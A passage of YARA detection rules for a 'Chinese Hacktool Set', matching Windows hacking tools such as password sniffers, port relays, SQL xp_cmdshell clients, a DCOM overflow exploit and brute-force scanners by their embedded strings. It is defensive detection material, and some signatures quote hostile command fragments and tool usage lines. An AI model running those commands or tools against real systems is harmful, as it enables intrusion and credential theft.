\"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'\" fullword ascii\n      $s2 = \"Password.txt\" fullword ascii\n      $s3 = \"LoginPrompt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule CN_Tools_MyUPnP_RID2C9A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MyUPnP.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:56:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n      $s2 = \"myupnp.exe\" fullword ascii\n      $s3 = \"LOADER ERROR\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and all of them\n}\n\nrule CN_Tools_Shiell_RID2CD2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Shiell.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n      $s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n      $s3 = \"Shift shell.exe\" fullword wide\n      $s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and 2 of them\n}\n\nrule cndcom_cndcom_RID2C58 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file cndcom.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:45:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n      $s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n      $s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n      $s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n      $s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n      $s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n      $s7 = \"\\\\C$\\\\123456111111111111111.doc\" wide\n      $s8 = \"shell3all.c\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule IsDebug_V1_4_RID2B2D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IsDebug V1.4.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IsDebug.dll\" fullword ascii\n      $s1 = \"SV Dumper V1.0\" fullword wide\n      $s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n      $s8 = \"Error WriteMemory failed\" fullword ascii\n      $s9 = \"IsDebugPresent\" fullword ascii\n      $s10 = \"idb_Autoload\" fullword ascii\n      $s11 = \"Bin Files\" fullword ascii\n      $s12 = \"MASM32 version\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule HScan_v1_20_PipeCmd_and_xCmd_RID3123 : CHINA DEMO EXE FILE HKTL T1021_002 T1569_002 {\n   meta:\n      description = \"Chinese Hacktool Set - file PipeCmd.exe / xCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1021_002, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n      $s2 = \"PipeCmd.exe\" fullword wide\n      $s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n      $s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n      $s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n      $s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n      $s9 = \"PIPECMDSRV\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule Dos_fp_RID296C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file fp.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 22:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n      $s2 = \"FPipe.exe\" fullword wide\n      $s3 = \"http://www.foundstone.com\" fullword ascii\n      $s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 65KB and all of them\n}\n\nrule CN_Tools_xsniff_RID2CFF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xsniff.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:13:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n      $s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n      $s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n      $s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n      $s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule MSSqlPass_RID2A78 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MSSqlPass_RID2A78.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:11:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n      $s1 = \"empv.exe\" fullword wide\n      $s2 = \"Enterprise Manager PassView\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule WSockExpert_RID2B70 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WSockExpert_RID2B70.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OpenProcessCmdExecute!\" fullword ascii\n      $s2 = \"http://www.hackp.com\" fullword ascii\n      $s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n      $s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n      $s5 = \"PasswordChar@\" fullword ascii\n      $s6 = \"WSockHook.DLL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule Ms_Viru_racle_RID2C3C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file racle.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n      $s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n      $s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n      $s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 210KB and all of them\n}\n\nrule lamescan3_RID2A88 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file lamescan3_RID2A88.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:38:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dic\\\\loginlist.txt\" fullword ascii\n      $s2 = \"Radmin.exe\" fullword ascii\n      $s3 = \"lamescan3_RID2A88.pdf!\" fullword ascii\n      $s4 = \"dic\\\\passlist.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3740KB and all of them\n}\n\nrule Dos_Down64_RID2A98 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Down64.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n      $s3 = \"C:\\\\Windows\\\\Temp\\\\\" wide\n      $s4 = \"ProcessXElement\" fullword ascii\n      $s8 = \"down.exe\" fullword wide\n      $s20 = \"set_Timer1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule epathobj_exp32_RID2C6F : CHINA DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Chinese Hacktool Set - file epathobj_exp32_RID2C6F.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:49:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n      $s1 = \"Exploit ok run command\" fullword ascii\n      $s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" ascii\n      $s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n      $s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 270KB and all of them\n}\n\nrule Tools_unknown_RID2C91 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file unknown.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n      $s5 = \"Host: 127.0.0.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule IISPutScanner_RID2BF9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IISPutScanner_RID2BF9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"KERNEL32.DLL\" fullword ascii\n      $s3 = \"ADVAPI32.DLL\" fullword ascii\n      $s4 = \"VERSION.DLL\" fullword ascii\n      $s5 = \"WSOCK32.DLL\" fullword ascii\n      $s6 = \"COMCTL32.DLL\" fullword ascii\n      $s7 = \"GDI32.DLL\" fullword ascii\n      $s8 = \"SHELL32.DLL\" fullword ascii\n      $s9 = \"USER32.DLL\" fullword ascii\n      $s10 = \"OLEAUT32.DLL\" fullword ascii\n      $s11 = \"LoadLibraryA\" fullword ascii\n      $s12 = \"GetProcAddress\" fullword ascii\n      $s13 = \"VirtualProtect\" fullword ascii\n      $s14 = \"VirtualAlloc\" fullword ascii\n      $s15 = \"VirtualFree\" fullword ascii\n      $s16 = \"ExitProcess\" fullword ascii\n      $s17 = \"RegCloseKey\" fullword ascii\n      $s18 = \"GetFileVersionInfoA\" fullword ascii\n      $s19 = \"ImageList_Add\" fullword ascii\n      $s20 = \"BitBlt\" fullword ascii\n      $s21 = \"ShellExecuteA\" fullword ascii\n      $s22 = \"ActivateKeyboardLayout\" fullword ascii\n      $s23 = \"BBABORT\" fullword wide\n      $s25 = \"BBCANCEL\" fullword wide\n      $s26 = \"BBCLOSE\" fullword wide\n      $s27 = \"BBHELP\" fullword wide\n      $s28 = \"BBIGNORE\" fullword wide\n      $s29 = \"PREVIEWGLYPH\" fullword wide\n      $s30 = \"DLGTEMPLATE\" fullword wide\n      $s31 = \"TABOUTBOX\" fullword wide\n      $s32 = \"TFORM1\" fullword wide\n      $s33 = \"MAINICON\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool_2_RID3119 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IdtTool.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:08:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Device\\\\devIdtTool\" wide\n      $s1 = \"IoDeleteSymbolicLink\" fullword ascii\n      $s3 = \"IoDeleteDevice\" fullword ascii\n      $s6 = \"IoCreateSymbolicLink\" fullword ascii\n      $s7 = \"IoCreateDevice\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7KB and all of them\n}\n\nrule hkmjjiis6_RID2AA0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hkmjjiis6_RID2AA0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:18:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"comspec\" fullword ascii\n      $s2 = \"user32.dlly\" ascii\n      $s3 = \"runtime error\" ascii\n      $s4 = \"WinSta0\\\\Defau\" ascii\n      $s5 = \"AppIDFlags\" fullword ascii\n      $s6 = \"GetLag\" fullword ascii\n      $s7 = \"* FROM IIsWebInfo\" ascii\n      $s8 = \"wmiprvse.exe\" ascii\n      $s9 = \"LookupAcc\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule Dos_lcx_RID29DD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file lcx.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n      $s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n      $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n      $s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n      $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n      $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n      $s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n      $s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n      $s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule x_way2_5_X_way_RID2C66 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file X-way.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:47:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"TTFTPSERVERFRM\" fullword wide\n      $s1 = \"TPORTSCANSETFRM\" fullword wide\n      $s2 = \"TIISSHELLFRM\" fullword wide\n      $s3 = \"TADVSCANSETFRM\" fullword wide\n      $s4 = \"ntwdblib.dll\" fullword ascii\n      $s5 = \"TSNIFFERFRM\" fullword wide\n      $s6 = \"TCRACKSETFRM\" fullword wide\n      $s7 = \"TCRACKFRM\" fullword wide\n      $s8 = \"dbnextrow\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule tools_Sqlcmd_RID2C05 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Sqlcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n      $s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii\n      $s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n      $s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n      $s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n      $s10 = \"Error,exit!\" fullword ascii\n      $s11 = \"Sqlcmd>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 3 of them\n}\n\nrule Sword1_5_RID29E5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Sword1.5.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 02:06:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n      $s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n      $s6 = \"ListBox_Command\" fullword wide\n      $s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n      $s18 = \"\\\\Set.ini\" wide\n      $s19 = \"OpenFileDialog1\" fullword wide\n      $s20 = \" (*.txt)|*.txt\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 4 of them\n}\n\nrule Dos_c_RID28F9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file c.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 19:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"!Win32 .EXE.\" fullword ascii\n      $s1 = \".MPRESS1\" fullword ascii\n      $s2 = \".MPRESS2\" fullword ascii\n      $s3 = \"XOLEHLP.dll\" fullword ascii\n      $s4 = \"</body></html>\" fullword ascii\n      $s8 = \"DtcGetTransactionManagerExA\" fullword ascii\n      $s9 = \"GetUserNameA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule arpsniffer_RID2B41 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file arpsniffer_RID2B41.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:58:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SHELL\" ascii\n      $s2 = \"PacketSendPacket\" fullword ascii\n      $s3 = \"ArpSniff\" ascii\n      $s4 = \"pcap_loop\" fullword ascii\n      $s5 = \"packet.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule pw_inspector_2_RID2CBF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pw-inspector.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n      $s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n      $s3 = \"PW-Inspector\" fullword ascii\n      $s4 = \"i:o:m:M:c:lunps\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule datPcShare_RID2AF0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file datPcShare_RID2AF0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PcShare.EXE\" fullword wide\n      $s2 = \"MZKERNEL32.DLL\" fullword ascii\n      $s3 = \"PcShare\" fullword wide\n      $s4 = \"QQ:4564405\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Tools_xport_RID2BBE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xport.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:19:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n      $s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n      $s3 = \"%s - command line port scanner\" fullword ascii\n      $s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n      $s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n      $s6 = \".\\\\port.ini\" fullword ascii\n      $s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n      $s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n      $s9 = \"http://www.xfocus.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule Pc_xai_RID2965 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xai.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 22:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n      $s2 = \"%SystemRoot%\\\\System32\\\\\" ascii\n      $s3 = \"%APPDATA%\\\\\" ascii\n      $s4 = \"---- C.Rufus Security Team ----\" fullword wide\n      $s5 = \"www.snzzkz.com\" fullword wide\n      $s6 = \"%CommonProgramFiles%\\\\\" ascii\n      $s7 = \"GetRand.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule Radmin_Hash_RID2B4F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Radmin_Hash_RID2B4F.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:01:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>IEBars</description>\" fullword ascii\n      $s2 = \"PECompact2\" fullword ascii\n      $s3 = \"Radmin, Remote Administrator\" fullword wide\n      $s4 = \"Radmin 3.0 Hash \" fullword wide\n      